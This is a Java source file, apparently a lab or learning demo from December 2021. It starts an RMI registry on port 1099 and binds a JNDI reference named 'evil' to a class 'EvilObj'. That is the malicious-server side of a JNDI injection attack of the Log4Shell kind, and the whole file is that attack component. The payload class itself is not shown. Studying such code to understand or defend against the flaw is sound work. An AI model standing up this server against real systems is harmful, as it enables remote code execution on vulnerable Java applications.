package com.cdtft.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @author: wangcheng
 * @date: 2021年12月11 13:32
 */
public class RMIServer {

    public static void main(String[] args) {
        try {
            LocateRegistry.createRegistry(1099);
            Registry registry = LocateRegistry.getRegistry();
            Reference reference = new Reference("com.cdtft.rmi.EvilObj", "com.cdtft.rmi.EvilObj", null);

            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            registry.bind("evil", referenceWrapper);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
